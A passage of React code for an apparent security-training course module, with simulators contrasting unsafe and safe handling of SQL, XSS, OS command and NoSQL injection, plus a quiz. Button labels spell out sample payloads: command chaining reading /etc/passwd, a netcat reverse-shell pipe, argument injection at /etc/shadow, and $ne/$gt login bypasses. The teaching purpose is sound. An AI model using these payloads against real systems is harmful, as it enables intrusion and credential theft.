                      <Flame className="w-5 h-5 text-rose-400 animate-pulse" />
                    ) : (
                      <ShieldCheck className="w-5 h-5 text-emerald-400" />
                    )}
                    <span>
                      {sqliSimulation.securityGrade === "EXPLOITED"
                        ? "SQL INJECTION EXPLOIT SUCCEEDED"
                        : "DATABASE QUERY SAFELY ISOLATED"}
                    </span>
                  </span>
                  <span className="font-mono text-[11px] px-2 py-0.5 rounded bg-stone-50/80">
                    Records Returned: {sqliSimulation.recordsReturned}
                  </span>
                </div>
                <p className="leading-relaxed text-stone-800">{sqliSimulation.executionOutcome}</p>
              </div>
            </div>
          )}

          {/* TAB: SIMULATOR 2 - CONTEXT-AWARE OUTPUT ENCODING */}
          {activeTab === "xss-sim" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-stone-900 flex items-center space-x-2">
                    <FileCode className="w-5 h-5 text-orange-600" />
                    <span>Simulator 2: Context-Aware Output Encoding Lab</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    Demonstrates why naive HTML escaping fails when untrusted data is rendered inside attributes, scripts, or URLs.
                  </p>
                </div>
              </div>

              {/* Controls */}
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                <div>
                  <label className="text-stone-600 block mb-1 font-semibold">Destination Sink Context</label>
                  <select
                    value={outputContext}
                    onChange={(e) => setOutputContext(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                  >
                    <option value="html_body">HTML Body Context (&lt;div&gt;...&lt;/div&gt;)</option>
                    <option value="html_attribute">HTML Attribute Context (&lt;input value=&quot;...&quot;&gt;)</option>
                    <option value="javascript_var">JavaScript Script Context (&lt;script&gt;var x=...&lt;/script&gt;)</option>
                    <option value="url_href">URL Href Context (&lt;a href=&quot;...&quot;&gt;)</option>
                  </select>
                </div>
                <div>
                  <label className="text-stone-600 block mb-1 font-semibold">Injected Payload</label>
                  <select
                    value={xssAttackPayload}
                    onChange={(e) => setXssAttackPayload(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                  >
                    <option value="script_tag">&lt;script&gt; tag injection</option>
                    <option value="attr_onfocus">&quot; onfocus=alert() attribute breakout</option>
                    <option value="js_breakout">&quot;; alert(); script breakout</option>
                    <option value="javascript_pseudo">javascript: URI pseudo-protocol</option>
                  </select>
                </div>
                <div>
                  <label className="text-stone-600 block mb-1 font-semibold">Encoding Strategy</label>
                  <select
                    value={encodingStrategy}
                    onChange={(e) => setEncodingStrategy(e.target.value)}
                    className="w-full bg-stone-50 border border-stone-200/80 rounded px-2.5 py-1.5 text-stone-800"
                  >
                    <option value="none">No Encoding (Raw Reflection)</option>
                    <option value="naive_html">Naive HTML Escaping (&lt; &gt; only)</option>
                    <option value="context_safe">Context-Appropriate Encoding</option>
                  </select>
                </div>
              </div>

              {/* Rendered DOM Sink */}
              <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 font-mono text-xs space-y-2">
                <div className="text-orange-600 font-bold border-b border-stone-200 pb-1">
                  Rendered Browser DOM Sink
                </div>
                <pre className="text-stone-700 text-[11px] overflow-x-auto whitespace-pre-wrap">
                  {xssContextData.renderedSink}
                </pre>
              </div>

              {/* Vulnerability Verdict */}
              <div
                className={`p-5 rounded-xl border text-xs space-y-3 ${
                  xssContextData.isVulnerable
                    ? "bg-rose-950/30 border-rose-800/80 text-rose-200"
                    : "bg-emerald-950/30 border-emerald-800/80 text-emerald-200"
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-sm flex items-center space-x-2">
                    {xssContextData.isVulnerable ? (
                      <Flame className="w-5 h-5 text-rose-400" />
                    ) : (
                      <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                    )}
                    <span>
                      {xssContextData.isVulnerable
                        ? "VULNERABILITY DETECTED: XSS EXECUTABLE"
                        : "SECURE: CONTEXT SAFELY NEUTRALIZED"}
                    </span>
                  </span>
                </div>
                <p className="leading-relaxed text-stone-800">{xssContextData.diagnosis}</p>
              </div>
            </div>
          )}

          {/* TAB: SIMULATOR 3 - OS COMMAND & ARGUMENT INJECTION */}
          {activeTab === "cmd-sim" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-stone-900 flex items-center space-x-2">
                    <Terminal className="w-5 h-5 text-orange-600" />
                    <span>Simulator 3: OS Command & Argument Injection Sandbox</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    Observe how shell interpretation enables command chaining, and how safe process APIs with argument arrays prevent exploitation.
                  </p>
                </div>
                <div className="flex items-center space-x-2">
                  <button
                    onClick={() =>
                      setCmdDefenseMode(cmdDefenseMode === "unsafe_shell" ? "safe_args" : "unsafe_shell")
                    }
                    className={`px-3 py-1.5 rounded-lg border text-xs font-bold transition ${
                      cmdDefenseMode === "safe_args"
                        ? "bg-emerald-950/60 border-emerald-500 text-emerald-300"
                        : "bg-rose-950/60 border-rose-500 text-rose-300 animate-pulse"
                    }`}
                  >
                    Execution: {cmdDefenseMode === "safe_args" ? "execFile (shell: false)" : "exec (/bin/sh -c)"}
                  </button>
                </div>
              </div>

              {/* Controls */}
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-4 space-y-3 text-xs">
                <div className="font-bold text-stone-700">Select Uploaded File Parameter:</div>
                <div className="grid grid-cols-1 sm:grid-cols-3 lg:grid-cols-5 gap-2">
                  <button
                    onClick={() => setCmdInputPayload("normal_file")}
                    className={`p-2 rounded-lg border text-left transition ${
                      cmdInputPayload === "normal_file"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-slate-950 border-stone-200 text-stone-600"
                    }`}
                  >
                    1. normal_file.mp4
                  </button>
                  <button
                    onClick={() => setCmdInputPayload("chained_semicolon")}
                    className={`p-2 rounded-lg border text-left transition ${
                      cmdInputPayload === "chained_semicolon"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-slate-950 border-stone-200 text-stone-600"
                    }`}
                  >
                    2. file.mp4; cat /etc/passwd
                  </button>
                  <button
                    onClick={() => setCmdInputPayload("ampersand_id")}
                    className={`p-2 rounded-lg border text-left transition ${
                      cmdInputPayload === "ampersand_id"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-slate-950 border-stone-200 text-stone-600"
                    }`}
                  >
                    3. file.mp4 &amp;&amp; id
                  </button>
                  <button
                    onClick={() => setCmdInputPayload("pipe_netcat")}
                    className={`p-2 rounded-lg border text-left transition ${
                      cmdInputPayload === "pipe_netcat"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-slate-950 border-stone-200 text-stone-600"
                    }`}
                  >
                    4. file.mp4 | nc reverse_shell
                  </button>
                  <button
                    onClick={() => setCmdInputPayload("arg_injection")}
                    className={`p-2 rounded-lg border text-left transition ${
                      cmdInputPayload === "arg_injection"
                        ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                        : "bg-slate-950 border-stone-200 text-stone-600"
                    }`}
                  >
                    5. --output=/etc/shadow
                  </button>
                </div>
              </div>

              {/* Terminal View */}
              <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 font-mono text-xs space-y-2">
                <div className="text-orange-600 font-bold border-b border-stone-200 pb-1 flex items-center justify-between">
                  <span>Backend Process Execution Trace</span>
                  <span className="text-[11px] text-stone-600">
                    Processes Spawned: {cmdSimulation.executedProcesses.length}
                  </span>
                </div>
                <div className="text-stone-600">Command: {cmdSimulation.commandLine}</div>
                <div className="pt-2 text-emerald-400">
                  <pre className="text-[11px] whitespace-pre-wrap">{cmdSimulation.terminalOutput}</pre>
                </div>
              </div>
            </div>
          )}

          {/* TAB: SIMULATOR 4 - NOSQL OPERATOR INJECTION */}
          {activeTab === "nosql-sim" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-stone-900 flex items-center space-x-2">
                    <Braces className="w-5 h-5 text-orange-600" />
                    <span>Simulator 4: NoSQL Injection & Operator Manipulation Lab</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    Test MongoDB query operator injection ($ne, $gt, $regex) and enforce schema validation.
                  </p>
                </div>
                <div className="flex items-center space-x-2">
                  <button
                    onClick={() =>
                      setNosqlValidation(
                        nosqlValidation === "blind_pass" ? "schema_enforced" : "blind_pass"
                      )
                    }
                    className={`px-3 py-1.5 rounded-lg border text-xs font-bold transition ${
                      nosqlValidation === "schema_enforced"
                        ? "bg-emerald-950/60 border-emerald-500 text-emerald-300"
                        : "bg-rose-950/60 border-rose-500 text-rose-300 animate-pulse"
                    }`}
                  >
                    Defense: {nosqlValidation === "schema_enforced" ? "SCHEMA ENFORCED" : "RAW BLIND PASS"}
                  </button>
                </div>
              </div>

              {/* Payload Buttons */}
              <div className="grid grid-cols-1 sm:grid-cols-4 gap-2 text-xs">
                <button
                  onClick={() => setNosqlPayload("ne_bypass")}
                  className={`p-2.5 rounded-lg border text-left transition ${
                    nosqlPayload === "ne_bypass"
                      ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                      : "bg-stone-50 border-stone-200 text-stone-600"
                  }`}
                >
                  1. &#123; $ne: &quot;&quot; &#125; (Not Equal)
                </button>
                <button
                  onClick={() => setNosqlPayload("gt_bypass")}
                  className={`p-2.5 rounded-lg border text-left transition ${
                    nosqlPayload === "gt_bypass"
                      ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                      : "bg-stone-50 border-stone-200 text-stone-600"
                  }`}
                >
                  2. &#123; $gt: &quot;&quot; &#125; (Greater Than)
                </button>
                <button
                  onClick={() => setNosqlPayload("regex_match")}
                  className={`p-2.5 rounded-lg border text-left transition ${
                    nosqlPayload === "regex_match"
                      ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                      : "bg-stone-50 border-stone-200 text-stone-600"
                  }`}
                >
                  3. &#123; $regex: &quot;^admin.*&quot; &#125;
                </button>
                <button
                  onClick={() => setNosqlPayload("normal_auth")}
                  className={`p-2.5 rounded-lg border text-left transition ${
                    nosqlPayload === "normal_auth"
                      ? "bg-cyan-950/60 border-cyan-500 text-orange-700 font-bold"
                      : "bg-stone-50 border-stone-200 text-stone-600"
                  }`}
                >
                  4. Normal String Login
                </button>
              </div>

              {/* Code comparison */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
                <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 space-y-1">
                  <div className="text-orange-600 font-bold border-b border-stone-200 pb-1">Incoming Client JSON Body</div>
                  <pre className="text-stone-700 text-[11px] overflow-x-auto">{nosqlSimulation.reqBody}</pre>
                </div>
                <div className="bg-stone-50 border border-stone-200/80 rounded-xl p-4 space-y-1">
                  <div className="text-amber-400 font-bold border-b border-stone-200 pb-1">Constructed MongoDB Filter</div>
                  <pre className="text-stone-700 text-[11px] overflow-x-auto">{nosqlSimulation.constructedFilter}</pre>
                </div>
              </div>

              {/* Verdict */}
              <div
                className={`p-5 rounded-xl border text-xs space-y-3 ${
                  nosqlSimulation.bypassSuccess
                    ? "bg-rose-950/30 border-rose-800/80 text-rose-200"
                    : "bg-emerald-950/30 border-emerald-800/80 text-emerald-200"
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-sm flex items-center space-x-2">
                    {nosqlSimulation.bypassSuccess ? (
                      <Flame className="w-5 h-5 text-rose-400 animate-pulse" />
                    ) : (
                      <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                    )}
                    <span>
                      {nosqlSimulation.bypassSuccess
                        ? "AUTHENTICATION BYPASSED VIA NOSQL OPERATOR"
                        : "QUERY SAFELY CONSTRAINED & SANITIZED"}
                    </span>
                  </span>
                </div>
                <p className="leading-relaxed text-stone-800">{nosqlSimulation.explanation}</p>
              </div>
            </div>
          )}

          {/* TAB: KNOWLEDGE ASSESSMENT QUIZ (14.14) */}
          {activeTab === "quiz" && (
            <div className="space-y-6">
              <div className="flex items-center justify-between border-b border-stone-200 pb-4">
                <div>
                  <h3 className="text-lg font-bold text-stone-900 flex items-center space-x-2">
                    <Award className="w-5 h-5 text-orange-600" />
                    <span>14.14 Injection Vulnerabilities Knowledge Assessment</span>
                  </h3>
                  <p className="text-xs text-stone-600 mt-0.5">
                    10 scenario-based questions to evaluate your mastery of the OWASP Top 10, injection vectors, and input handling.
                  </p>
                </div>
                {quizSubmitted && (
                  <div className="text-right">
                    <span className="text-xs text-stone-600">Final Score: </span>
                    <span
                      className={`text-base font-bold font-mono ${
                        quizScore >= 8 ? "text-emerald-400" : "text-amber-400"
                      }`}
                    >
                      {quizScore} / 10 ({quizScore * 10}%)
                    </span>
                  </div>
                )}
              </div>

              <div className="space-y-4">
                {quizQuestions.map((q, idx) => {
                  const isAnswered = quizAnswers[q.id] !== undefined;
                  const isCorrect = isAnswered && quizAnswers[q.id] === q.correct;

                  return (
                    <div
                      key={q.id}
                      className="bg-white border border-stone-200/80 shadow-xs rounded-xl p-5 space-y-3 text-xs"
                    >
                      <div className="flex items-start justify-between">
                        <span className="font-bold text-white text-sm">
                          {idx + 1}. {q.question}
                        </span>
                        {quizSubmitted && (
                          <span
                            className={`px-2 py-0.5 rounded text-[11px] font-bold ${
                              isCorrect
                                ? "bg-emerald-950 text-emerald-400 border border-emerald-800"
                                : "bg-rose-950 text-rose-400 border border-rose-800"
                            }`}
                          >
                            {isCorrect ? "Correct" : "Incorrect"}
                          </span>
                        )}
                      </div>

                      <div className="space-y-2">
                        {q.options.map((opt, optIdx) => {
                          const isSelected = quizAnswers[q.id] === optIdx;
                          let btnStyle = "bg-slate-950 border-stone-200 text-stone-700 hover:bg-slate-850";

                          if (quizSubmitted) {
                            if (optIdx === q.correct) {
                              btnStyle = "bg-emerald-950/60 border-emerald-500 text-emerald-200 font-bold";
                            } else if (isSelected) {
                              btnStyle = "bg-rose-950/60 border-rose-500 text-rose-200";
                            } else {
                              btnStyle = "bg-stone-50 border-slate-900 text-stone-500";
                            }
                          } else if (isSelected) {
                            btnStyle = "bg-cyan-950/60 border-cyan-400 text-cyan-200 font-semibold";
                          }

                          return (
                            <button
                              key={optIdx}
                              disabled={quizSubmitted}
                              onClick={() => handleSelectAnswer(q.id, optIdx)}
                              className={`w-full text-left p-3 rounded-lg border transition flex items-center justify-between ${btnStyle}`}
                            >
                              <span>{opt}</span>
                              {isSelected && <Check className="w-3.5 h-3.5 text-orange-600" />}
                            </button>
                          );
                        })}
                      </div>

                      {quizSubmitted && (
                        <div className="mt-3 p-3 bg-slate-950 rounded-lg border border-stone-200 text-stone-700 text-[11px] leading-relaxed">
                          <strong className="text-orange-600">Architectural Rationale: </strong>
                          {q.explanation}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>

              {!quizSubmitted ? (
                <button
                  onClick={() => setQuizSubmitted(true)}
                  disabled={Object.keys(quizAnswers).length < quizQuestions.length}
                  className={`w-full py-3 rounded-xl font-bold text-xs uppercase tracking-wider transition ${
                    Object.keys(quizAnswers).length === quizQuestions.length
                      ? "bg-cyan-500 hover:bg-cyan-400 text-slate-950 shadow-lg shadow-cyan-500/20"
                      : "bg-slate-800 text-stone-500 cursor-not-allowed"
                  }`}
                >
                  Submit Assessment ({Object.keys(quizAnswers).length}/10 Answered)
                </button>
              ) : (
                <button
                  onClick={() => {
                    setQuizSubmitted(false);
                    setQuizAnswers({});
                  }}
                  className="w-full py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-stone-800 font-bold text-xs uppercase tracking-wider transition"
                >
                  Retake Assessment
                </button>
              )}
            </div>
          )}
        </div>
      </main>

      {/* Embedded Nova AI Tutor Drawer */}
      <LearningRo
        isOpen={showAiTutor}
        onClose={() => setShowAiTutor(false)}
        topic="OWASP Top 10, Injection Vulnerabilities, and Secure Input Handling"
        courseContext="Prepspaces Cybersecurity Master Course - Module 14"
      />
    </div>
  );
}
